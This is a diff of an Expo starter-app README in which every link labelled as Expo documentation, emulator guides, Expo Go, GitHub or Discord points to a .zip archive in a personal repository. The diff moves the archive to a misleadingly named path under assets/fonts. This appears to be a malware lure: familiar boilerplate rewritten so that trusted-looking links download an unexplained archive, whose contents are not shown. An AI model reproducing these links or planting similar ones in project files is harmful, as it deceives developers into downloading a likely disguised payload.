@@ -1,6 +1,6 @@
 # Welcome to your Expo app 👋
 
-This is an [Expo](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip) project created with [`create-expo-app`](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip).
+This is an [Expo](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip) project created with [`create-expo-app`](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip).
 
 ## Get started
 
@@ -18,12 +18,12 @@ This is an [Expo](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react
 
 In the output, you'll find options to open the app in a
 
-- [development build](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip)
-- [Android emulator](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip)
-- [iOS simulator](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip)
-- [Expo Go](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip), a limited sandbox for trying out app development with Expo
+- [development build](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip)
+- [Android emulator](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip)
+- [iOS simulator](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip)
+- [Expo Go](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip), a limited sandbox for trying out app development with Expo
 
-You can start developing by editing the files inside the **app** directory. This project uses [file-based routing](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip).
+You can start developing by editing the files inside the **app** directory. This project uses [file-based routing](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip).
 
 ## Get a fresh project
 
@@ -39,12 +39,12 @@ This command will move the starter code to the **app-example** directory and cre
 
 To learn more about developing your project with Expo, look at the following resources:
 
-- [Expo documentation](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip): Learn fundamentals, or go into advanced topics with our [guides](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip).
-- [Learn Expo tutorial](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip): Follow a step-by-step tutorial where you'll create a project that runs on Android, iOS, and the web.
+- [Expo documentation](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip): Learn fundamentals, or go into advanced topics with our [guides](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip).
+- [Learn Expo tutorial](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip): Follow a step-by-step tutorial where you'll create a project that runs on Android, iOS, and the web.
 
 ## Join the community
 
 Join our community of developers creating universal apps.
 
-- [Expo on GitHub](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip): View our open source platform and contribute.
-- [Discord community](https://raw.githubusercontent.com/ronaldodjj/laboratorio_react_native/main/sorosphere/laboratorio_react_native.zip): Chat with Expo users and ask questions.
+- [Expo on GitHub](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip): View our open source platform and contribute.
+- [Discord community](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip): Chat with Expo users and ask questions.
